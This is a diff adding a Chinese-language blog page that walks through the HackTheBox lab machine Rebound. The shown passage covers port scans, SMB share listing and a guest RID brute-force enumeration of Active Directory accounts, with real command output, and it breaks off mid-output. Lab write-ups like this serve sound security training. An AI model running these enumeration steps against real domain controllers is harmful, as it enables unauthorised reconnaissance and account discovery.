@@ -1,0 +1,1595 @@
+<!doctype html>
+<html
+  lang="zh-cn" 
+  data-theme-mode="auto"
+  >
+  <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset="utf-8" />
+<meta
+  name="viewport"
+  content="width=device-width, initial-scale=1, shrink-to-fit=no"
+/><title>
+  HTB Rebound | Ya1orin
+</title>
+<meta name="description" content="HackTheBox篇ADCS系列之Rebound"/><script>
+  window.siteConfig = JSON.parse("{\"anchor_icon\":null,\"base\":\"http://localhost:1313/\",\"clipboard\":{\"copyright\":{\"count\":50,\"enable\":false,\"license_type\":\"by-nc-sa\"},\"fail\":{\"en\":\"Copy failed (ﾟ⊿ﾟ)ﾂ\",\"ja\":\"コピー失敗 (ﾟ⊿ﾟ)ﾂ\",\"pt-br\":\"Falha ao copiar (ﾟ⊿ﾟ)ﾂ\",\"zh-cn\":\"复制失败 (ﾟ⊿ﾟ)ﾂ\",\"zh-tw\":\"複製失敗 (ﾟ⊿ﾟ)ﾂ\"},\"success\":{\"en\":\"Copy successfully (*^▽^*)\",\"ja\":\"コピー成功 (*^▽^*)\",\"pt-br\":\"Copiado com sucesso (*^▽^*)\",\"zh-cn\":\"复制成功 (*^▽^*)\",\"zh-tw\":\"複製成功 (*^▽^*)\"}},\"code_block\":{\"expand\":true},\"i18n_languages\":[{\"Lang\":\"en\",\"LanguageName\":\"English\",\"LanguageCode\":\"\",\"Title\":\"\",\"LanguageDirection\":\"\",\"Weight\":1,\"Disabled\":false},{\"Lang\":\"zh-cn\",\"LanguageName\":\"简体中文\",\"LanguageCode\":\"\",\"Title\":\"\",\"LanguageDirection\":\"\",\"Weight\":1,\"Disabled\":false}],\"icon_font\":\"4552607_4k4bc36ef96\",\"outdate\":{\"daysago\":180,\"enable\":false,\"message\":{\"en\":\"This article was last updated on {time}. Please note that the content may no longer be applicable.\",\"ja\":\"この記事は最終更新日：{time}。記載内容が現在有効でない可能性がありますのでご注意ください。\",\"pt-br\":\"Este artigo foi atualizado pela última vez em {time}. Observe que o conteúdo pode não ser mais aplicável.\",\"zh-cn\":\"本文最后更新于 {time}，请注意文中内容可能已不适用。\",\"zh-tw\":\"本文最後更新於 {time}，請注意文中內容可能已不適用。\"}}}");
+  
+</script>
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+<link
+  rel="preload"
+  as="style"
+  href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic%7cNoto%20Serif%20SC:400,400italic,700,700italic%7c&amp;display=swap"
+/>
+<link
+  rel="stylesheet"
+  href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic%7cNoto%20Serif%20SC:400,400italic,700,700italic%7c&amp;display=swap"
+  media="print"
+  onload="this.media='all'"
+/>
+<link
+    rel="preload"
+    href="//at.alicdn.com/t/c/font_4552607_4k4bc36ef96.woff2"
+    as="font"
+    type="font/woff2"
+    crossorigin="anonymous"
+  /><link rel="stylesheet" href="/css/loader.css" />
+<meta property="og:type" content="website" />
+  <meta property="og:title" content="HTB Rebound | Ya1orin" />
+  <meta
+    property="og:description"
+    content="HackTheBox篇ADCS系列之Rebound"
+  />
+  <meta property="og:url" content="http://localhost:1313/post/htb-rebound/" />
+  <meta
+    property="og:site_name"
+    content="Ya1orin"
+  />
+  <meta
+    property="og:image"
+    content="/"
+  />
+  <meta property="article:author" content="Ya1orin" />
+  <meta property="article:published_time" content="2025-03-28T12:06:05&#43;08:00" />
+  <meta property="article:modified_time" content="2025-11-11T15:12:29&#43;08:00" /><meta property="article:tag" content="WindowsRID CyclingAS-REP RoastingKerberoastingShadow CredentialsACL abuseRemotePotato0DACL abuseRBCD" /><meta name="twitter:card" content="summary" />
+  <meta name="twitter:image" content="/" />
+<link rel="shortcut icon" href="/favicon.ico"><link rel="stylesheet" href="/css/main.css" />
+<link
+    rel="preload"
+    as="style"
+    href="https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.css"
+    integrity="sha384-IfxC36XL/toUyJ939C73PcgMuRzAZuIzZxE38drsmO5p6jD7ei&#43;Zx/1oA/0l8ysE" crossorigin="anonymous"onload="this.onload=null;this.rel='stylesheet'"
+  /><link
+    rel="preload"
+    as="style"
+    href="https://npm.webcache.cn/katex@0.16.24/dist/katex.min.css"
+    integrity="sha384-tTgKLjMYmJr94v8qu2PE5MUGSMbyN2xiH266JUB3gpm8vnnJywd1dWSOEfrFz&#43;YI" crossorigin="anonymous"onload="this.onload=null;this.rel='stylesheet'"
+  /><link
+    rel="stylesheet"
+    href="https://npm.webcache.cn/gitalk@1.8.0/dist/gitalk.css"
+    integrity="sha384-X7z7PUv2B67D8sPJyzDyGZSco1ADwmdI7ed4eCGtTKkClfyDFpPL9WgAn9XVr/Io" crossorigin="anonymous"/><script
+    src="https://npm.webcache.cn/pace-js@1.2.4/pace.min.js"
+    integrity="sha384-k6YtvFUEIuEFBdrLKJ3YAUbBki333tj1CSUisai5Cswsg9wcLNaPzsTHDswp4Az8" crossorigin="anonymous"></script><link
+    rel="stylesheet"
+    href="https://npm.webcache.cn/@reimujs/aos@0.1.2/dist/aos.css"
+    integrity="sha384-GMRP93c6Hkz9JVKGAuRR3nTS7M07RwPgTFenXiosjq2VbVgvdDNcz1g6Mkj8AONa" crossorigin="anonymous"/></head>
+  <body><div id='loader'>
+    <div class="loading-left-bg loading-bg"></div>
+    <div class="loading-right-bg loading-bg"></div>
+    <div class="spinner-box">
+      <div class="loading-taichi rotate"><svg width="150" height="150" viewBox="0 0 1024 1024" class="icon" version="1.1" xmlns="https://www.w3.org/2000/svg" shape-rendering="geometricPrecision">
+            <path d="M303.5 432A80 80 0 0 1 291.5 592A80 80 0 0 1 303.5 432z" fill="var(--red-1, #ff5252)" />
+            <path d="M512 65A447 447 0 0 1 512 959L512 929A417 417 0 0 0 512 95A417 417 0 0 0 512 929L512 959A447 447 0 0 1 512 65z 
+          M512 95A417 417 0 0 1 929 512A208.5 208.5 0 0 1 720.5 720.5L720.5 592A80 80 0 0 0 720.5 432A80 80 0 0 0 720.5 592L720.5 720.5A208.5 208.5 0 0 1 512 512A208.5 208.5 0 0 0 303.5 303.5A208.5 208.5 0 0 0 95 512A417 417 0 0 1 512 95z" fill="var(--red-1, #ff5252)" />
+          </svg></div><div class="loading-word">Loading...</div>
+    </div>
+  </div>
+  </div>
+  <script>
+    var time = null;
+    var loaderEl = document.getElementById('loader');
+    var startLoading = () => {
+      time = Date.now();
+      loaderEl.classList.remove("loading");
+    }
+    var hideLoader = () => {
+      document.body.style.overflow = 'auto';
+      loader.classList.add('loading');
+    };
+
+    var endLoading = () => {
+      if (!time) {
+        hideLoader();
+      } else {
+        if (Date.now() - time > 500) {
+          time = null;
+          hideLoader();
+        } else {
+          setTimeout(endLoading, 500 - (Date.now() - time));
+          time = null;
+        }
+      }
+    }
+    window.addEventListener('DOMContentLoaded', endLoading);
+    loaderEl.addEventListener('click', endLoading);
+  </script><div id="copy-tooltip"></div>
+<div id="lang-tooltip">
+本文章没有找到对应的语言版本
+</div>
+<div id="heatmap-tooltip"></div><div id="container">
+      <div id="wrap"><div id="header-nav">
+  <nav id="main-nav" aria-label="Primary navigation"><a class="main-nav-link-wrap" href="/">
+        <div class='main-nav-icon icon rotate'>&#xe62b;</div>
+        <span class="main-nav-link">首页</span>
+      </a><a class="main-nav-link-wrap" href="/archives">
+        <div class='main-nav-icon icon rotate'>&#xe62b;</div>
+        <span class="main-nav-link">归档</span>
+      </a><a class="main-nav-link-wrap" href="/about">
+        <div class='main-nav-icon icon rotate'>&#xe62b;</div>
+        <span class="main-nav-link">关于</span>
+      </a><a class="main-nav-link-wrap" href="/friend">
+        <div class='main-nav-icon icon rotate'>&#xe62b;</div>
+        <span class="main-nav-link">友链</span>
+      </a><a id="main-nav-toggle" class="nav-icon" aria-label="Toggle navigation" role="button"></a>
+  </nav>
+  <nav id="sub-nav" aria-label="Secondary navigation"><a id="nav-search-btn" class="nav-icon popup-trigger" title="搜索" aria-label="搜索"></a></nav><nav id="i18n-nav" aria-label="Language selection">
+      <div class="custom-dropdown">
+        <div class="select-selected" id="select-selected" role="button" aria-haspopup="listbox" aria-expanded="false" aria-label="Language menu">
+          <span id="nav-language-btn" class="nav-icon" style="padding: 0 20px 0 0"></span>
+          <span id="selected-lang">简体中文</span>
+        </div>
+        <ul class="select-items" id="select-items" role="listbox" aria-label="Languages"><li data-value="en" role="option" arial-selected="false" >English</li><li data-value="zh-cn" role="option" class="selected" arial-selected="true" >简体中文</li></ul>
+      </div>
+      <script>
+        var selectSelected = document.getElementById("select-selected");
+        var selectedLang = document.getElementById("selected-lang");
+        var selectItems = document.getElementById("select-items");
+        var selectOptions = selectItems.querySelectorAll("li");
+
+        selectSelected.addEventListener("click", () => {
+          selectItems.classList.toggle("show");
+          var expanded = selectSelected.getAttribute("aria-expanded") === "true";
+          selectSelected.setAttribute("aria-expanded", (!expanded).toString());
+        });
+
+        selectOptions.forEach((item) => {
+          item.addEventListener("click", () => {
+            const langMap = {};selectedLang.textContent = item.textContent;
+            selectItems.classList.remove("show");
+            selectOptions.forEach((option) => {
+              option.classList.remove("selected");
+            });
+            item.classList.add("selected");
+            if (item.dataset.value === 'zh-cn') {
+              return;
+            }
+            if (!langMap[item.dataset.value]) {
+              _$("#lang-tooltip").style.opacity = "1";
+              setTimeout(() => {
+                _$("#lang-tooltip").style.opacity = "0";
+              }, 1000);
+              return;
+            }
+            window.location = langMap[item.dataset.value];
+          });
+        });
+
+        document.addEventListener("click", (event) => {
+          if (!event.target.closest(".custom-dropdown")) {
+            selectItems.classList.remove("show");
+            selectSelected.setAttribute("aria-expanded", "false");
+          }
+        });
+      </script>
+    </nav></div>
+<header id="header" aria-label="Site header"><picture></picture><img  fetchpriority="high" src="/images/banner.webp" alt="HTB Rebound"><div id="header-outer">
+    <div id="header-title"><span id="logo">
+            <h1 data-aos="slide-up">HTB Rebound</h1>
+          </span><h2 id="subtitle-wrap" data-aos="slide-down"></h2></div>
+  </div>
+</header><div id="content"
+          aria-label="Page content"
+          class="sidebar-left"
+            ><aside id="sidebar" aria-label="Sidebar"><div class="sidebar-wrapper-container sticky"><div class="sidebar-wrapper">
+    <div
+      class="sidebar-wrap"
+      data-aos="fade-up"
+    ><div class="sidebar-toc-sidebar"><h3 class="toc-title">文章目录</h3>
+<div class="sidebar-toc-wrapper toc-div-class">
+  <nav id="TableOfContents">
+  <ul>
+    <li><a href="#知识点">知识点</a></li>
+    <li><a href="#信息收集">信息收集</a></li>
+    <li><a href="#smb服务">SMB服务</a></li>
+    <li><a href="#as-rep-roasting">AS-REP Roasting</a></li>
+    <li><a href="#kerberoasting">Kerberoasting</a></li>
+    <li><a href="#bloodhound信息收集">bloodhound信息收集</a></li>
+    <li><a href="#密码喷洒">密码喷洒</a></li>
+    <li><a href="#攻击面分析">攻击面分析</a></li>
+    <li><a href="#拿下winrm_svc">拿下winrm_svc！</a></li>
+    <li><a href="#后信息收集">后信息收集</a></li>
+    <li><a href="#remotepotato0跨会话中继">RemotePotato0跨会话中继</a></li>
+    <li><a href="#readgmsapassword">ReadGMSAPassword</a></li>
+    <li><a href="#再次信息收集">再次信息收集</a></li>
+    <li><a href="#约束委派-">约束委派 ×</a></li>
+    <li><a href="#基于资源的约束委派-">基于资源的约束委派 √</a></li>
+    <li><a href="#pth登录">PTH登录</a></li>
+  </ul>
+</nav>
+</div></div>
+          <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
+  <img
+    data-src="/avatar/avatar.webp"
+    data-sizes="auto"
+    alt="Ya1orin"
+    class="lazyload"
+  />
+  <div class="sidebar-author-name">Ya1orin</div>
+  <div class="sidebar-description"></div>
+</div>
+<div class="sidebar-state">
+  <div class="sidebar-state-article">
+    <div>文章</div><div class="sidebar-state-number">43</div>
+  </div>
+  <a class="sidebar-state-category" href="/categories/" aria-label="sidebar-state-category-link">
+    <div>分类</div>
+    <div class="sidebar-state-number">
+      3
+    </div>
+  </a>
+  <a class="sidebar-state-tag" href="/tags/" aria-label="sidebar-state-tag-link">
+    <div>标签</div>
+    <div class="sidebar-state-number">37</div>
+  </a>
+</div>
+<div class="sidebar-social"><div class="icon-github sidebar-social-icon">
+      <a
+        href="https://github.com/ya1orin"
+        itemprop="url"
+        target="_blank"
+        aria-label="github"
+        rel="noopener nofollow noreferrer"
+      ></a>
+    </div></div>
+<div class="sidebar-menu"><div class="sidebar-menu-link-wrap">
+      <a
+        class="sidebar-menu-link-dummy"
+        href="/"
+        aria-label="首页"
+      ></a>
+      <div class='sidebar-menu-icon icon rotate'>&#xe62b;</div>
+      <div class="sidebar-menu-link">首页</div>
+    </div><div class="sidebar-menu-link-wrap">
+      <a
+        class="sidebar-menu-link-dummy"
+        href="/archives"
+        aria-label="归档"
+      ></a>
+      <div class='sidebar-menu-icon icon rotate'>&#xe62b;</div>
+      <div class="sidebar-menu-link">归档</div>
+    </div><div class="sidebar-menu-link-wrap">
+      <a
+        class="sidebar-menu-link-dummy"
+        href="/about"
+        aria-label="关于"
+      ></a>
+      <div class='sidebar-menu-icon icon rotate'>&#xe62b;</div>
+      <div class="sidebar-menu-link">关于</div>
+    </div><div class="sidebar-menu-link-wrap">
+      <a
+        class="sidebar-menu-link-dummy"
+        href="/friend"
+        aria-label="友链"
+      ></a>
+      <div class='sidebar-menu-icon icon rotate'>&#xe62b;</div>
+      <div class="sidebar-menu-link">友链</div>
+    </div></div>
+</div><div class="sidebar-btn-wrapper" style="position:static">
+            <div class="sidebar-toc-btn current"></div>
+            <div class="sidebar-common-btn"></div>
+          </div></div>
+  </div><div class="sidebar-widget"></div></div></aside>
+<section id="main" aria-label="Main content"><article
+  class="h-entry article"
+  itemscope
+  itemtype="https://schema.org/BlogPosting"
+>
+  <div
+    class="article-inner"
+    data-aos="fade-up"
+  >
+    <div class="article-meta"><div class="article-date">
+  <span
+    class="article-date-link icon-calendar"
+    data-aos="zoom-in"
+  >
+    <time datetime="2025-03-28 12:06:05 &#43;0800 CST" itemprop="datePublished"
+      >2025-03-28</time
+    >
+    <time style="display: none;" id="post-update-time"
+      >2025-11-11</time
+    >
+  </span></div>
+<div class="article-category"><a
+      class="article-category-link"
+      href="/categories/hackthebox"
+      data-aos="zoom-in"
+      >HACKTHEBOX</a
+    ></div>
+</div><div class="hr-line"></div><div class="e-content article-entry" itemprop="articleBody"><blockquote>
+<p>靶机ip：10.10.11.231</p>
+</blockquote>
+<h1 id="知识点">
+<a class="header-anchor" href="#%e7%9f%a5%e8%af%86%e7%82%b9"></a>
+知识点
+</h1><ul>
+<li>RID枚举</li>
+<li>AS-REP Roasting</li>
+<li>新型Kerberoasting</li>
+<li>密码喷洒</li>
+<li>ACL权限滥用</li>
+<li>Shadow Credentials 攻击</li>
+<li>利用RemotePotato0跨会话中继</li>
+<li>ReadGMSAPassword</li>
+<li>约束委派</li>
+<li>基于资源的约束委派</li>
+<li>PTH登录</li>
+</ul>
+<h1 id="信息收集">
+<a class="header-anchor" href="#%e4%bf%a1%e6%81%af%e6%94%b6%e9%9b%86"></a>
+信息收集
+</h1><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">rustscan -a 10.10.11.231 -u <span class="m">5000</span>
+</span></span><span class="line"><span class="cl">.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
+</span></span><span class="line"><span class="cl"><span class="p">|</span> <span class="o">{}</span>  <span class="o">}</span><span class="p">|</span> <span class="o">{</span> <span class="o">}</span> <span class="p">|</span><span class="o">{</span> <span class="o">{</span>__ <span class="o">{</span>_   _<span class="o">}{</span> <span class="o">{</span>__  /  ___<span class="o">}</span> / <span class="o">{}</span> <span class="se">\ </span><span class="p">|</span>  <span class="sb">`</span><span class="p">|</span> <span class="p">|</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> .-. <span class="se">\|</span> <span class="o">{</span>_<span class="o">}</span> <span class="p">|</span>.-._<span class="o">}</span> <span class="o">}</span> <span class="p">|</span> <span class="p">|</span>  .-._<span class="o">}</span> <span class="o">}</span><span class="se">\ </span>    <span class="o">}</span>/  /<span class="se">\ </span> <span class="se">\|</span> <span class="p">|</span><span class="se">\ </span> <span class="p">|</span>
+</span></span><span class="line"><span class="cl"><span class="sb">`</span>-<span class="s1">&#39; `-&#39;</span><span class="sb">`</span>-----<span class="s1">&#39;`----&#39;</span>  <span class="sb">`</span>-<span class="s1">&#39;  `----&#39;</span>  <span class="sb">`</span>---<span class="s1">&#39; `-&#39;</span>  <span class="sb">`</span>-<span class="s1">&#39;`-&#39;</span> <span class="sb">`</span>-<span class="err">&#39;</span>
+</span></span><span class="line"><span class="cl">The Modern Day Port Scanner.
+</span></span><span class="line"><span class="cl">________________________________________
+</span></span><span class="line"><span class="cl">: http://discord.skerritt.blog         :
+</span></span><span class="line"><span class="cl">: https://github.com/RustScan/RustScan :
+</span></span><span class="line"><span class="cl"> --------------------------------------
+</span></span><span class="line"><span class="cl">TCP handshake? More like a friendly high-five!
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">[</span>~<span class="o">]</span> The config file is expected to be at <span class="s2">&#34;/root/.rustscan.toml&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>~<span class="o">]</span> Automatically increasing <span class="nb">ulimit</span> value to 5000.
+</span></span><span class="line"><span class="cl">Open 10.10.11.231:53
+</span></span><span class="line"><span class="cl">Open 10.10.11.231:88
+</span></span><span class="line"><span class="cl">Open 10.10.11.231:135
+</span></span><span class="line"><span class="cl">Open 10.10.11.231:139
+</span></span><span class="line"><span class="cl">Open 10.10.11.231:389
+</span></span><span class="line"><span class="cl">Open 10.10.11.231:445
+</span></span><span class="line"><span class="cl">Open 10.10.11.231:464
+</span></span><span class="line"><span class="cl">Open 10.10.11.231:593
+</span></span><span class="line"><span class="cl">Open 10.10.11.231:636
+</span></span><span class="line"><span class="cl">Open 10.10.11.231:3268
+</span></span><span class="line"><span class="cl">Open 10.10.11.231:3269
+</span></span><span class="line"><span class="cl">Open 10.10.11.231:5985
+</span></span><span class="line"><span class="cl">Open 10.10.11.231:9389
+</span></span><span class="line"><span class="cl">Open 10.10.11.231:47001
+</span></span><span class="line"><span class="cl">Open 10.10.11.231:49666
+</span></span><span class="line"><span class="cl">Open 10.10.11.231:49664
+</span></span><span class="line"><span class="cl">Open 10.10.11.231:49665
+</span></span><span class="line"><span class="cl">Open 10.10.11.231:49667
+</span></span><span class="line"><span class="cl">Open 10.10.11.231:49671
+</span></span><span class="line"><span class="cl">Open 10.10.11.231:49686
+</span></span><span class="line"><span class="cl">Open 10.10.11.231:49687
+</span></span><span class="line"><span class="cl">Open 10.10.11.231:49688
+</span></span><span class="line"><span class="cl">Open 10.10.11.231:49701
+</span></span><span class="line"><span class="cl">Open 10.10.11.231:49716
+</span></span><span class="line"><span class="cl">Open 10.10.11.231:49737
+</span></span></code></pre></div><p>扫描一下特别的端口，确定一下<code>hosts</code>文件内容</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">nmap -T4 -p 53,88,135,139,389,445,464,593,636,3268,3269,5985,9389 -sV -sC 10.10.11.231
+</span></span><span class="line"><span class="cl">Starting Nmap 7.95 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2025-03-26 23:15 CST
+</span></span><span class="line"><span class="cl">Nmap scan report <span class="k">for</span> dc01 <span class="o">(</span>10.10.11.231<span class="o">)</span>
+</span></span><span class="line"><span class="cl">Host is up <span class="o">(</span>0.090s latency<span class="o">)</span>.
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">PORT     STATE SERVICE       VERSION
+</span></span><span class="line"><span class="cl">53/tcp   open  domain        Simple DNS Plus
+</span></span><span class="line"><span class="cl">88/tcp   open  kerberos-sec  Microsoft Windows Kerberos <span class="o">(</span>server time: 2025-03-26 15:18:03Z<span class="o">)</span>
+</span></span><span class="line"><span class="cl">135/tcp  open  msrpc         Microsoft Windows RPC
+</span></span><span class="line"><span class="cl">139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
+</span></span><span class="line"><span class="cl">389/tcp  open  ldap          Microsoft Windows Active Directory LDAP <span class="o">(</span>Domain: rebound.htb0., Site: Default-First-Site-Name<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> ssl-cert: Subject:
+</span></span><span class="line"><span class="cl"><span class="p">|</span> Subject Alternative Name: DNS:dc01.rebound.htb, DNS:rebound.htb, DNS:rebound
+</span></span><span class="line"><span class="cl"><span class="p">|</span> Not valid before: 2025-03-06T19:51:11
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_Not valid after:  2122-04-08T14:05:49
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_ssl-date: 2025-03-26T15:18:57+00:00<span class="p">;</span> +2m23s from scanner time.
+</span></span><span class="line"><span class="cl">445/tcp  open  microsoft-ds?
+</span></span><span class="line"><span class="cl">464/tcp  open  kpasswd5?
+</span></span><span class="line"><span class="cl">593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+</span></span><span class="line"><span class="cl">636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP <span class="o">(</span>Domain: rebound.htb0., Site: Default-First-Site-Name<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> ssl-cert: Subject:
+</span></span><span class="line"><span class="cl"><span class="p">|</span> Subject Alternative Name: DNS:dc01.rebound.htb, DNS:rebound.htb, DNS:rebound
+</span></span><span class="line"><span class="cl"><span class="p">|</span> Not valid before: 2025-03-06T19:51:11
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_Not valid after:  2122-04-08T14:05:49
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_ssl-date: 2025-03-26T15:18:57+00:00<span class="p">;</span> +2m23s from scanner time.
+</span></span><span class="line"><span class="cl">3268/tcp open  ldap          Microsoft Windows Active Directory LDAP <span class="o">(</span>Domain: rebound.htb0., Site: Default-First-Site-Name<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> ssl-cert: Subject:
+</span></span><span class="line"><span class="cl"><span class="p">|</span> Subject Alternative Name: DNS:dc01.rebound.htb, DNS:rebound.htb, DNS:rebound
+</span></span><span class="line"><span class="cl"><span class="p">|</span> Not valid before: 2025-03-06T19:51:11
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_Not valid after:  2122-04-08T14:05:49
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_ssl-date: 2025-03-26T15:18:57+00:00<span class="p">;</span> +2m23s from scanner time.
+</span></span><span class="line"><span class="cl">3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP <span class="o">(</span>Domain: rebound.htb0., Site: Default-First-Site-Name<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_ssl-date: 2025-03-26T15:18:57+00:00<span class="p">;</span> +2m23s from scanner time.
+</span></span><span class="line"><span class="cl"><span class="p">|</span> ssl-cert: Subject:
+</span></span><span class="line"><span class="cl"><span class="p">|</span> Subject Alternative Name: DNS:dc01.rebound.htb, DNS:rebound.htb, DNS:rebound
+</span></span><span class="line"><span class="cl"><span class="p">|</span> Not valid before: 2025-03-06T19:51:11
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_Not valid after:  2122-04-08T14:05:49
+</span></span><span class="line"><span class="cl">5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 <span class="o">(</span>SSDP/UPnP<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-title: Not Found
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-server-header: Microsoft-HTTPAPI/2.0
+</span></span><span class="line"><span class="cl">9389/tcp open  mc-nmf        .NET Message Framing
+</span></span><span class="line"><span class="cl">Service Info: OS: Windows<span class="p">;</span> CPE: cpe:/o:microsoft:windows
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Host script results:
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_clock-skew: mean: 2m22s, deviation: 0s, median: 2m22s
+</span></span><span class="line"><span class="cl"><span class="p">|</span> smb2-security-mode:
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   3:1:1:
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_    Message signing enabled and required
+</span></span><span class="line"><span class="cl"><span class="p">|</span> smb2-time:
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   date: 2025-03-26T15:18:48
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_  start_date: N/A
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span><span class="line"><span class="cl">Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 58.28 seconds
+</span></span></code></pre></div><p>将下面的内容添加到<code>/etc/hosts</code>中</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">10.10.11.231 dc01 rebound.htb dc01.rebound.htb
+</span></span></code></pre></div><h1 id="smb服务">
+<a class="header-anchor" href="#smb%e6%9c%8d%e5%8a%a1"></a>
+SMB服务
+</h1><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">smbclient -L //10.10.11.231
+</span></span><span class="line"><span class="cl">Password <span class="k">for</span> <span class="o">[</span>WORKGROUP<span class="se">\r</span>oot<span class="o">]</span>:
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        Sharename       Type      Comment
+</span></span><span class="line"><span class="cl">        ---------       ----      -------
+</span></span><span class="line"><span class="cl">        ADMIN$          Disk      Remote Admin
+</span></span><span class="line"><span class="cl">        C$              Disk      Default share
+</span></span><span class="line"><span class="cl">        IPC$            IPC       Remote IPC
+</span></span><span class="line"><span class="cl">        NETLOGON        Disk      Logon server share
+</span></span><span class="line"><span class="cl">        Shared          Disk
+</span></span><span class="line"><span class="cl">        SYSVOL          Disk      Logon server share
+</span></span><span class="line"><span class="cl">Reconnecting with SMB1 <span class="k">for</span> workgroup listing.
+</span></span><span class="line"><span class="cl">do_connect: Connection to 10.10.11.231 failed <span class="o">(</span>Error NT_STATUS_RESOURCE_NAME_NOT_FOUND<span class="o">)</span>
+</span></span><span class="line"><span class="cl">Unable to connect with SMB1 -- no workgroup available
+</span></span></code></pre></div><p>看到有个<code>Shared</code>共享，查看一下</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">smbclient //10.10.11.231/Shared
+</span></span><span class="line"><span class="cl">Password <span class="k">for</span> <span class="o">[</span>WORKGROUP<span class="se">\r</span>oot<span class="o">]</span>:
+</span></span><span class="line"><span class="cl">Try <span class="s2">&#34;help&#34;</span> to get a list of possible commands.
+</span></span><span class="line"><span class="cl">smb: <span class="se">\&gt;</span> ls
+</span></span><span class="line"><span class="cl">  .                                   D        <span class="m">0</span>  Sat Aug <span class="m">26</span> 05:46:36 <span class="m">2023</span>
+</span></span><span class="line"><span class="cl">  ..                                  D        <span class="m">0</span>  Sat Aug <span class="m">26</span> 05:46:36 <span class="m">2023</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">                <span class="m">4607743</span> blocks of size 4096. <span class="m">1025329</span> blocks available
+</span></span><span class="line"><span class="cl">smb: <span class="se">\&gt;</span>
+</span></span></code></pre></div><p>没什么东西，使用<code>nxc</code>进行RID枚举，将最大数量设置成<code>10000</code>（多次测试后发现8000以后几乎没有用户）</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">nxc smb 10.10.11.231 -u <span class="s2">&#34;test&#34;</span> -p <span class="s2">&#34;&#34;</span> --rid-brute <span class="m">10000</span> --log smb_rid_brute
+</span></span><span class="line"><span class="cl">SMB         10.10.11.231    <span class="m">445</span>    DC01             <span class="o">[</span>*<span class="o">]</span> Windows <span class="m">10</span> / Server <span class="m">2019</span> Build <span class="m">17763</span> x64 <span class="o">(</span>name:DC01<span class="o">)</span> <span class="o">(</span>domain:rebound.htb<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
+</span></span><span class="line"><span class="cl">SMB         10.10.11.231    <span class="m">445</span>    DC01             <span class="o">[</span>+<span class="o">]</span> rebound.htb<span class="se">\t</span>est: <span class="o">(</span>Guest<span class="o">)</span>
+</span></span><span class="line"><span class="cl">SMB         10.10.11.231    <span class="m">445</span>    DC01             498: rebound<span class="se">\E</span>nterprise Read-only Domain Controllers <span class="o">(</span>SidTypeGroup<span class="o">)</span>
+</span></span><span class="line"><span class="cl">SMB         10.10.11.231    <span class="m">445</span>    DC01             500: rebound<span class="se">\A</span>dministrator <span class="o">(</span>SidTypeUser<span class="o">)</span>
+</span></span><span class="line"><span class="cl">SMB         10.10.11.231    <span class="m">445</span>    DC01             501: rebound<span class="se">\G</span>uest <span class="o">(</span>SidTypeUser<span class="o">)</span>
+</span></span><span class="line"><span class="cl">SMB         10.10.11.231    <span class="m">445</span>    DC01             502: rebound<span class="se">\k</span>rbtgt <span class="o">(</span>SidTypeUser<span class="o">)</span>
+</span></span><span class="line"><span class="cl">SMB         10.10.11.231    <span class="m">445</span>    DC01             512: rebound<span class="se">\D</span>omain Admins <span class="o">(</span>SidTypeGroup<span class="o">)</span>
